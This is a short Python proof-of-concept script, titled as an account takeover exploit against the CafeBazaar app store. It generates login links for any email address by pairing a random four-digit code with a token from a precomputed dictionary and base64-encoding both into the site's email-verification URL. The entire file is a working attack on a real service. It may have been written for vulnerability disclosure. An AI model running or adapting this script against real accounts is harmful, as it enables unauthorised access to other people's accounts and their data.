#!/usr/bin/env python3
# *_* coding: utf-8 *_*

"""
CafeBazaar account takeover poc
"""

import random
import base64
import json


# This loads the token information as a dictionary.
try:
    with open("token_dict.json") as f:
        TOKEN_DICT = json.load(f)
except Exception as e:
    print(f"Failed to read the JSON file: {e}")
    exit()


def generate_link_token(four_digit_code: str) -> str or None:
    """
    This function returns the link token matching the input 4-digit code.

    :param four_digit_code: 4-digit code
    :return: matching link token if the 4-digit code exists in the dictionary (97%), None otherwise(3%)
    """

    if four_digit_code in TOKEN_DICT:
        return TOKEN_DICT[four_digit_code]
    return None


def generate_login_link(email_address: str) -> str or None:
    """
    This function generates a random login link for the input email address.

    :param email_address: a user's email address.
    :return: if success, the generated login link, None otherwise.
    """

    four_digit_code = "%04d" % random.randint(0, 9_999)
    print(f"+ Random 4-digit code: {four_digit_code}")

    link_token = generate_link_token(four_digit_code)
    print(f"+ Link token: {link_token}")
    if not link_token:
        return None

    login_data = base64.b64encode(f"{email_address}&{link_token}".encode()).decode()
    login_link = f"https://cafebazaar.ir/emailverify/{login_data}/?next=/account/%3Fl%3Dfa"
    return login_link


def main():

    while True:
        email_address = input("* Enter E-mail address: ")

        login_link = generate_login_link(email_address)
        if not login_link:
            print("- Failed to find the matching link token for the generated code.")
            print("- Try again.")
            continue

        print("+ Login link:")
        print(login_link)


if __name__ == "__main__":
    main()
